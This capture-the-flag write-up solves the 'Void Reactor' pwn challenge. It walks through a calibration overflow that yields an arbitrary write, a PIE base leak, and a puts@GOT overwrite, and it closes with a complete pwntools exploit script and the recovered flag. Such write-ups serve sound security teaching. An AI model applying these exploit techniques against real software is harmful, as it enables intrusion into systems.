# Void Reactor 

**Category:** Pwn / Binary Exploitation  
**Binary:** `void_reactor`  
**Flag format:** `Lun4R{...}`

## 1. Challenge Description

The challenge presents an experimental reactor management system with several operations:

```text
1) INSERT     Load a fuel rod
2) CALIBRATE  Recalibrate rod payload
3) INSPECT    View rod telemetry
4) EXTRACT    Remove a rod
5) ACTIVATE   Fire a gamma rod
6) STATUS     Reactor diagnostics
7) SCRAM      Emergency shutdown
```

The objective is to bypass the reactor's authorization mechanism and trigger the hidden meltdown routine.

---

## 2. Initial Binary Recon

First, identify the binary:

```bash
file void_reactor
```

Output:

```text
ELF 64-bit LSB pie executable, x86-64
dynamically linked
stripped
```

The binary is stripped, but useful strings are still present:

```bash
strings -n 5 void_reactor
```

Interesting strings include:

```text
[!] Meltdown aborted: core override token invalid.
======================================================
 [!] CRITICAL CORE MELTDOWN ACHIEVED - SYSTEM DUMP
======================================================
 [+] EMERGENCY TELEMETRY FLAG:
```

This immediately suggests that there is a hidden meltdown/flag routine.

---

## 3. Finding the Authorization Token

Disassembling the binary reveals a function around `0x136b` containing the authorization check.

The important instructions are:

```asm
mov    rdx,QWORD PTR [rip+0x4c7a]   # 0x6000
movabs rax,0xcafebabe1337beef
cmp    rdx,rax
je     ...
```

Therefore the required authorization token is:

```text
0xcafebabe1337beef
```

and the token is stored at:

```text
PIE + 0x6000
```

The function at:

```text
PIE + 0x136b
```

is the hidden meltdown/flag routine.

---

## 4. Understanding the Rod Structure

The reactor uses a custom allocator/arena and stores rods in slots.

The important part is the calibration operation.

For a selected rod, the program eventually performs:

```asm
read(0, r14, 0x41)
```

That means it accepts:

```text
0x41 = 65 bytes
```

of calibration data.

The rod payload starts at `r14`.

The gamma rod contains important fields at:

```text
offset 0x28  -> target address
offset 0x30  -> value to write
```

This becomes extremely important because the activation routine performs:

```asm
mov rdx,QWORD PTR [rax+0x28]
mov rax,QWORD PTR [rax+0x30]

...

mov QWORD PTR [rdx],rax
```

In pseudocode:

```c
*(uint64_t *)target = value;
```

So we have a **write-what-where primitive**.

---

## 5. The Calibration Overflow

The calibration operation gives us 65 bytes, even though the normal payload area is smaller.

The relevant layout is:

```text
Offset
0x00 ───────────────── payload
...
0x28 ───────────────── target address
0x30 ───────────────── value
...
```

Therefore our calibration payload can be constructed as:

```python
payload = b"A" * 0x28
payload += p64(target)
payload += p64(value)
payload += b"A" * remaining
```

The crucial offsets are:

```text
0x28 = 40 bytes
0x30 = 48 bytes
```

So the payload is:

```text
40 bytes padding
8 bytes target
8 bytes value
```

---

## 6. Getting the PIE Base

Because the binary is PIE, hardcoding:

```text
0x6000
0x4008
0x136b
```

isn't enough.

Fortunately, the `STATUS` command leaks:

```text
Arena base : 0x........
```

The arena is located at:

```text
PIE base + 0x7000
```

This can be confirmed from the initialization code:

```asm
lea rdx,[rip+0x5abf]    # 0x7000
```

Therefore:

```text
PIE base = leaked_arena_base - 0x7000
```

Once the PIE base is known, all interesting addresses become predictable.

---

## 7. Important Addresses

From the disassembly:

| Object | Address |
|---|---:|
| Hidden meltdown routine | `PIE + 0x136b` |
| Authorization token | `PIE + 0x6000` |
| `puts()` GOT entry | `PIE + 0x4008` |
| Arena | `PIE + 0x7000` |

The hidden routine begins with:

```asm
mov rdx,[PIE+0x6000]
movabs rax,0xcafebabe1337beef
cmp rdx,rax
```

So we first need to write the correct token.

---

# 8. Step 1 — Create a Gamma Rod

Use:

```text
1
```

Then choose:

```text
3
```

for Gamma.

For example:

```text
Rod class (1=alpha, 2=beta, 3=gamma): 3
Identifier: GAMMA
Serial: 1
```

We now have a gamma rod in slot `0`.

---

# 9. Step 2 — Overwrite the Authorization Token

The first arbitrary write targets:

```text
PIE + 0x6000
```

and writes:

```text
0xcafebabe1337beef
```

Payload:

```python
payload = b"A" * 0x28
payload += p64(base + 0x6000)
payload += p64(0xcafebabe1337beef)
payload = payload.ljust(0x41, b"A")
```

Then:

```text
2
```

select slot:

```text
0
```

and send the 65-byte payload.

The resulting memory write is:

```c
*(uint64_t *)(base + 0x6000)
    = 0xcafebabe1337beef;
```

The authorization token is now valid.

---

# 10. Step 3 — Activate the Gamma Rod

Use:

```text
5
```

and select:

```text
0
```

The activation code executes:

```asm
target = *(uint64_t *)(rod + 0x28);
value  = *(uint64_t *)(rod + 0x30);

*(uint64_t *)target = value;
```

Therefore our first write successfully changes the core authorization token.

---

# 11. Step 4 — Hijack `puts()`

We still need to execute the hidden meltdown routine.

The easiest way is to overwrite the GOT entry for `puts()`.

The relocation table shows:

```text
puts@GOT = PIE + 0x4008
```

The hidden routine is:

```text
PIE + 0x136b
```

So the second arbitrary write becomes:

```python
payload = b"A" * 0x28
payload += p64(base + 0x4008)
payload += p64(base + 0x136b)
payload = payload.ljust(0x41, b"A")
```

This changes:

```text
puts@GOT
```

from the real libc `puts()` address to:

```text
PIE + 0x136b
```

---

# 12. Why the GOT Overwrite Works

After activation, the program executes:

```c
puts("[*] Core injection complete.");
```

Normally this calls:

```text
puts@PLT
    ↓
puts@GOT
    ↓
libc puts()
```

After our overwrite:

```text
puts@PLT
    ↓
puts@GOT
    ↓
PIE + 0x136b
    ↓
hidden meltdown routine
```

This is the key control-flow hijack.

---

# 13. Hidden Meltdown Routine

The hidden routine first verifies the authorization token:

```asm
mov    rdx,[PIE+0x6000]
movabs rax,0xcafebabe1337beef
cmp    rdx,rax
jne    abort
```

We already changed the token, so execution continues.

It then decrypts the hidden transmission.

The routine uses an 8-byte XOR key:

```text
5a a5 3c c3 7e e7 1f f1
```

and a ciphertext stored inside `.rodata`.

The decryption algorithm is effectively:

```python
plaintext[i] = ciphertext[i] ^ key[i % 8]
```

---

# 14. Recovering the Flag

The embedded ciphertext is:

```text
16 d0 52 f7 2c 9c 69 c1
6b c1 63 b1 4d d3 7c 85
6a d7 63 a0 0c d6 6b c0
39 91 50 9c 13 d4 73 85
3e 95 4b ad 21 86 7c 99
6b 96 4a f0 1a 9a
```

with the repeating key:

```text
5a a5 3c c3 7e e7 1f f1
```

XORing them gives:

```text
Lun4R{v01d_r34ct0r_cr1t1c4l_m3ltd0wn_ach13v3d}
```

---

# 15. Exploit Chain

The complete exploitation chain is:

```text
STATUS
  │
  ├── leak Arena base
  │
  └── PIE base = Arena base - 0x7000
          │
          ▼
INSERT Gamma Rod
          │
          ▼
CALIBRATE
  │
  └── target = PIE + 0x6000
      value  = 0xcafebabe1337beef
          │
          ▼
ACTIVATE
  │
  └── overwrite authorization token
          │
          ▼
CALIBRATE
  │
  └── target = PIE + 0x4008
      value  = PIE + 0x136b
          │
          ▼
ACTIVATE
  │
  └── overwrite puts@GOT
          │
          ▼
puts() called
          │
          ▼
PIE + 0x136b
          │
          ▼
Authorization check passes
          │
          ▼
XOR decryption
          │
          ▼
FLAG
```

---

# 16. Minimal Exploit Logic

A pwntools-style exploit can be written as:

```python
from pwn import *

elf = ELF("./void_reactor")
p = process("./void_reactor")

# 1. Leak PIE through STATUS
p.sendlineafter(b"REACTOR> ", b"6")
p.recvuntil(b"Arena base  : ")
arena = int(p.recvline().strip(), 16)

base = arena - 0x7000

TOKEN = base + 0x6000
PUTS_GOT = base + 0x4008
MELTDOWN = base + 0x136b

# 2. Insert gamma rod
p.sendlineafter(b"REACTOR> ", b"1")
p.sendlineafter(b"Rod class (1=alpha, 2=beta, 3=gamma): ", b"3")
p.sendlineafter(b"Identifier: ", b"GAMMA")
p.sendlineafter(b"Serial: ", b"1")

def calibrate(target, value):
    p.sendlineafter(b"REACTOR> ", b"2")
    p.sendlineafter(b"Slot: ", b"0")

    payload = b"A" * 0x28
    payload += p64(target)
    payload += p64(value)
    payload = payload.ljust(0x41, b"A")

    p.sendafter(b"Calibration payload (65 bytes): ", payload)

def activate():
    p.sendlineafter(b"REACTOR> ", b"5")
    p.sendlineafter(b"Slot: ", b"0")

# 3. Set authorization token
calibrate(TOKEN, 0xcafebabe1337beef)
activate()

# 4. Redirect puts() to hidden meltdown function
calibrate(PUTS_GOT, MELTDOWN)
activate()

p.interactive()
```

The exact I/O synchronization may need minor adjustment depending on the CTF service wrapper.

---

# 17. Vulnerability Summary

The challenge combines several vulnerabilities:

### 1. Out-of-bounds calibration write

The program accepts:

```text
65 bytes
```

of calibration data and allows us to overwrite fields beyond the intended payload.

### 2. Arbitrary write primitive

The gamma activation routine trusts two attacker-controlled fields:

```text
target
value
```

and performs:

```c
*(uint64_t *)target = value;
```

### 3. PIE information leak

`STATUS` leaks the arena address, allowing calculation of the PIE base:

```text
PIE = Arena - 0x7000
```

### 4. Writable GOT

The binary has a writable `puts()` GOT entry at:

```text
PIE + 0x4008
```

allowing control-flow hijacking.

### 5. Hidden authorization routine

The secret routine requires:

```text
0xcafebabe1337beef
```

before decrypting the embedded flag.

---

<img width="919" height="794" alt="image" src="https://github.com/user-attachments/assets/caf3a8db-8ff2-40db-a809-d3124970e74a" />


# Flag

```text
Lun4R{v01d_r34ct0r_cr1t1c4l_m3ltd0wn_ach13v3d}
```
